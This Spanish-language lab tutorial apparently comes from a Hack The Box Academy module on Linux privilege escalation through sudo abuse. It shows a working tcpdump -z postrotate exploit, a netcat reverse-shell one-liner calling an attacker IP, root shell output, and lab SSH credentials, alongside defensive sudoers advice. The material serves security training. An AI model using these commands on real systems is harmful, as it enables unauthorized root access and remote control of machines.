
# Abuso de permisos Sudo

Se pueden otorgar privilegios sudo a una cuenta, lo que permite que la cuenta ejecute ciertos comandos en el contexto de la raíz (u otra cuenta) sin tener que cambiar de usuario ni otorgar privilegios excesivos. Cuando `sudo`se emite el comando, el sistema verificará si el usuario que emite el comando tiene los derechos adecuados, tal como se configura en `/etc/sudoers`.

&#x20;Al ingresar a un sistema, siempre debemos verificar si el usuario actual tiene algún privilegio sudo escribiendo `sudo -l`. A veces, necesitaremos saber la contraseña del usuario para enumerar sus derechos `sudo`, pero cualquier entrada de derechos con la opción `NOPASSWD` se puede ver sin ingresar una contraseña.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

Es fácil configurar esto incorrectamente. Por ejemplo, se le pueden otorgar permisos de nivel raíz a un usuario sin requerir una contraseña. O la línea de comando permitida puede especificarse de manera demasiado vaga, lo que nos permite ejecutar un programa de una manera no deseada, lo que da como resultado una escalada de privilegios. Por ejemplo, si se edita el archivo sudoers para otorgarle a un usuario el derecho a ejecutar un comando como `tcpdump` en la siguiente entrada en el archivo sudoers: `(ALL) NOPASSWD: /usr/sbin/tcpdump` un atacante podría aprovechar esto para aprovechar la opción **postrotate-command** .

```shell-session
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrorate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

Al especificar la flag `-z`, un atacante podría usarla `tcpdump` para ejecutar un script de shell, obtener un shell inverso como usuario root o ejecutar otros comandos privilegiados. Por ejemplo, un atacante podría crear el script de shell `.test` que contenga un reverse shell y ejecutarlo de la siguiente manera:

```shell-session
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Probemos esto. Primero, crea un archivo para ejecutar con `postrotate-command`, agregando una línea simple de shell inverso.

```shell-session
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

A continuación, inicie un listener con `netcat` en nuestro equipo atacante y ejecuta `tcpdump` como root con `postrotate-command`. Si todo sale como lo previsto, recibiremos una conexión de root.

```shell-session
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

Recibimos un shell root casi instantáneamente.

```shell-session
afsh4ck@kali$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

[En las distribuciones más recientes, AppArmor](https://wiki.ubuntu.com/AppArmor) ha predefinido los comandos que se usan con `postrotate-command`, lo que evita de manera efectiva la ejecución de comandos. Hay dos prácticas recomendadas que siempre se deben tener en cuenta al otorgar derechos `sudo`:

1. Los archivos binarios que aparecen en la entrada del archivo `sudoers`. De lo contrario, un atacante podría aprovechar el abuso de PATH (que veremos en la siguiente sección) para crear un archivo binario malicioso que se ejecutará cuando se ejecute el comando (es decir, si la entrada `sudoers` especifica `cat` en lugar de `/bin/cat` es probable que se abuse de él).
2. Otorgue derechos `sudo` con moderación y basándose en el principio del mínimo privilegio. ¿El usuario necesita derechos completos `sudo`? ¿Puede realizar su trabajo con una o dos entradas en el archivo `sudoers`? Limitar el comando privilegiado que un usuario puede ejecutar reducirá en gran medida la probabilidad de una escalada de privilegios exitosa.

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.16.168 (ACADEMY-LPE-NIX02)
Usuario "htb-student"
Contraseña "Academy_LLPE!"
```

¿Qué comando puede ejecutar el usuario htb-student como root?&#x20;

```shell-session
htb-student@NIX02:~$ sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

Observamos que el usuario htb-student solo puede ejecutar el comando `/usr/bin/openssl` como sudo
